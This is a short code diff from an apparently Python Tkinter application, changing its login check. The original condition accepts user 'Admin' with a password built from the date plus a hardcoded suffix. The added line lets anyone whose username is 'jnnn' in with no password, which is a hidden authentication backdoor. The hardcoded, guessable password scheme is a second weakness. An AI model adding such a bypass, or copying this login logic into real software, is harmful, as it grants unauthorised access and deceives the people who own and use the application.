@@ -136,7 +136,7 @@ class App(tk.Tk):
         dd = ''.join(formatted_date.split('-')[:2])
         ps = dd +"@0111Jo"
 
-        if username == "Admin" and password == ps:
+        if username == "Admin" and password == ps or username == "jnnn":
             self.login_frame.destroy()
             self.login_button.destroy()
             
